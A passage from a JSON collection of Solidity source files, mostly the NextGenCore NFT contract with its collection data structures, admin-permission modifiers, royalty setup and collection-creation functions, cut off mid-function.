_tokenId) public view returns(string memory, string memory) {\n        return (tokenImageAndAttributes[_tokenId][0],tokenImageAndAttributes[_tokenId][1]);\n    }\n\n}"
    },
    {
      "filename": "smart-contracts/NextGenCore.sol",
      "content": "// SPDX-License-Identifier: MIT\n\n/**\n *\n *  @title: NextGen Smart Contract\n *  @date: 19-October-2023 \n *  @version: 10.28\n *  @author: 6529 team\n */\n\npragma solidity ^0.8.19;\n\nimport \"./ERC721Enumerable.sol\";\nimport \"./Ownable.sol\";\nimport \"./Strings.sol\";\nimport \"./Base64.sol\";\nimport \"./IRandomizer.sol\";\nimport \"./INextGenAdmins.sol\";\nimport \"./IMinterContract.sol\";\nimport \"./ERC2981.sol\";\n\ncontract NextGenCore is ERC721Enumerable, Ownable, ERC2981 {\n    using Strings for uint256;\n\n    // declare variables\n    uint256 public newCollectionIndex;\n\n    // collectionInfo struct declaration\n    struct collectionInfoStructure {\n        string collectionName;\n        string collectionArtist;\n        string collectionDescription;\n        string collectionWebsite;\n        string collectionLicense;\n        string collectionBaseURI;\n        string collectionLibrary;\n        string[] collectionScript;\n    }\n\n    // mapping of collectionInfo struct\n    mapping (uint256 => collectionInfoStructure) private collectionInfo;\n\n    // collectionAdditionalData struct declaration\n    struct collectionAdditonalDataStructure {\n        address collectionArtistAddress;\n        uint256 maxCollectionPurchases;\n        uint256 collectionCirculationSupply;\n        uint256 collectionTotalSupply;\n        uint256 reservedMinTokensIndex;\n        uint256 reservedMaxTokensIndex;\n        uint setFinalSupplyTimeAfterMint;\n        address randomizerContract;\n        IRandomizer randomizer;\n    }\n\n    // mapping of collectionAdditionalData struct\n    mapping (uint256 => collectionAdditonalDataStructure) private collectionAdditionalData;\n\n    // other mappings\n\n    // checks if a collection was created\n    mapping (uint256 => bool) private isCollectionCreated; \n\n    // checks if data on a collection were added\n    mapping (uint256 => bool) private wereDataAdded;\n\n    // maps tokends ids with collectionsids\n    mapping (uint256 => uint256) private tokenIdsToCollectionIds;\n\n    // stores randomizer hash\n    mapping(uint256 => bytes32) private tokenToHash;\n\n    // minted tokens per address per collection during public sale\n    mapping (uint256 => mapping (address => uint256)) private tokensMintedPerAddress;\n\n    // minted tokens per address per collection during allowlist\n    mapping (uint256 => mapping (address => uint256)) private tokensMintedAllowlistAddress;\n\n    // tokens airdrop per address per collection \n    mapping (uint256 => mapping (address => uint256)) private tokensAirdropPerAddress;\n\n    // current amount of burnt tokens per collection\n    mapping (uint256 => uint256) public burnAmount;\n\n    // modify the metadata view\n    mapping (uint256 => bool) public onchainMetadata; \n\n    // artist signature per collection\n    mapping (uint256 => string) public artistsSignatures;\n\n    // tokens additional metadata\n    mapping (uint256 => string) public tokenData;\n\n    // on-chain token Image URI and attributes\n    mapping (uint256 => string[2]) private tokenImageAndAttributes;\n\n    // collectionFreeze \n    mapping (uint256 => bool) private collectionFreeze;\n\n    // artist signed\n    mapping (uint256 => bool) public artistSigned; \n\n    // external contracts declaration\n    INextGenAdmins private adminsContract;\n    address public minterContract;\n\n    // smart contract constructor\n    constructor(string memory name, string memory symbol, address _adminsContract) ERC721(name, symbol) {\n        adminsContract = INextGenAdmins(_adminsContract);\n        newCollectionIndex = newCollectionIndex + 1;\n        _setDefaultRoyalty(0x1B1289E34Fe05019511d7b436a5138F361904df0, 690);\n    }\n\n    // certain functions can only be called by a global or function admin\n\n    modifier FunctionAdminRequired(bytes4 _selector) {\n      require(adminsContract.retrieveFunctionAdmin(msg.sender, _selector) == true || adminsContract.retrieveGlobalAdmin(msg.sender) == true , \"Not allowed\");\n      _;\n    }\n\n    // certain functions can only be called by a collection, global or function admin\n\n    modifier CollectionAdminRequired(uint256 _collectionID, bytes4 _selector) {\n      require(adminsContract.retrieveCollectionAdmin(msg.sender,_collectionID) == true || adminsContract.retrieveFunctionAdmin(msg.sender, _selector) == true || adminsContract.retrieveGlobalAdmin(msg.sender) == true, \"Not allowed\");\n      _;\n    }\n\n    // function to create a Collection\n\n    function createCollection(string memory _collectionName, string memory _collectionArtist, string memory _collectionDescription, string memory _collectionWebsite, string memory _collectionLicense, string memory _collectionBaseURI, string memory _collectionLibrary, string[] memory _collectionScript) public FunctionAdminRequired(this.createCollection.selector) {\n        collectionInfo[newCollectionIndex].collectionName = _collectionName;\n        collectionInfo[newCollectionIndex].collectionArtist = _collectionArtist;\n        collectionInfo[newCollectionIndex].collectionDescription = _collectionDescription;\n        collectionInfo[newCollectionIndex].collectionWebsite = _collectionWebsite;\n        collectionInfo[newCollectionIndex].collectionLicense = _collectionLicense;\n        collectionInfo[newCollectionIndex].collectionBaseURI = _collectionBaseURI;\n        collectionInfo[newCollectionIndex].collectionLibrary = _collectionLibrary;\n        collectionInfo[newCollectionIndex].collectionScript = _collectionScript;\n        isCollectionCreated[newCollectionIndex] = true;\n        newCollectionIndex = newCollectionIndex + 1;\n    }\n\n    // function to add/modify the additional data of a collection\n    // once a collection is created and total supply is set it cannot be changed\n    // only _collectionArtistAddress , _maxCollectionPurchases can change after total supply is set\n\n    function setCollectionData(uint256 _collectionID, address _collectionArtistAddress, uint256 _maxCollectionPurchases, uint256 _collectionTotalSupply, uint _setFinalSupplyTimeAfterMint) public CollectionAdminRequired(_collectionID, this.setCollectionData.selector) {\n        require((isCollectionCreated[_collectionID] == true) && (collectionFreeze[_collectionID] == false) && (_collectionTotalSupply <= 10000000000), \"err/freezed\");\n        if (collectionAdditionalData[_collectionID].collectionTotalSupply == 0) {\n            collectionAdditionalData[_collectionID].collectionArtistAddress = _collectionArtistAddress;\n            collectionAdditionalData[_collectionID].maxCollectionPurchases = _maxCollectionPurchases;\n            collectionAdditionalData[_collectionID].collectionCirculationSupply = 0;\n            collectionAdditionalData[_collectionID].collectionTotalSupply = _collectionTotalSupply;\n            collectionAdditionalData[_collectionID].setFinalSupplyTimeAfterMint = _setFinalSupplyTimeAfterMint;\n            collectionAdditionalData[_collectionID].reservedMinTokensIndex = (_collectionID * 10000000000);\n            collectionAdditionalData[_collectionID].reservedMaxTokensIndex = (_collectionID * 10000000000) + _collectionTotalSupply - 1;\n            wereDataAdded[_collectionID] = true;\n        } else if (artistSigned[_collectionID] == false) {\n            collectionAdditionalData[_collectionID].collectionArtistAddress = _collectionArtistAddress;\n            collectionAdditionalData[_collectionID].maxCollectionPurchases = _maxCollectionPurchases;\n            collectionAdditionalData[_collectionID].setFinalSupplyTimeAfterMint = _setFinalSupplyTimeAfterMint;\n        } else {\n            collectionAdditionalData[_collectionID].maxCollectionPurchases = _maxCollectionPurchases;\n            collectionAdditionalData[_collectionID].setFinalSupplyTimeAfterMint = _setFin"
    }
  ]
}